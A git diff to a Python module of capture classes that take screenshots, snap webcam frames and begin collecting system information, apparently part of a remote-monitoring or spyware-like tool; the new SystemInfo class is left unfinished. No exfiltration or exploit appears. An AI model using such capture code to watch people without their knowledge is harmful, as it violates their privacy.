@@ -1,7 +1,12 @@
 import abc
 import pyautogui
 import cv2
+import platform
 import datetime
+from pydub import AudioSegment
+from pydub.playback import play
+from playsound import playsound
+
 from captures import cpath
 
 
@@ -22,11 +27,11 @@ class Screenshot(Module):
 class WebcamSnap(Module):
 
     def run(self, save_path_name):
-        id = self.search_camera_id()
-        if id == -1:
+        cam_id = self.search_camera_id()
+        if cam_id == -1:
             pass
         else:
-            webcam = cv2.VideoCapture(id)
+            webcam = cv2.VideoCapture(cam_id)
             check, frame = webcam.read()
             cv2.imwrite(cpath.route + 'webcam_snap-' + save_path_name + '.jpg', img=frame)
             webcam.release()
@@ -42,7 +47,12 @@ class WebcamSnap(Module):
                 return id
         return -1
 
+class SystemInfo(Module):
 
-if __name__ == '__main__':
-    screenShot = Screenshot()
-    screenShot.run('xdxd')
+    def run(self, save_path_name):
+        uname = platform.uname()
+        data = {
+        }
+
+
+
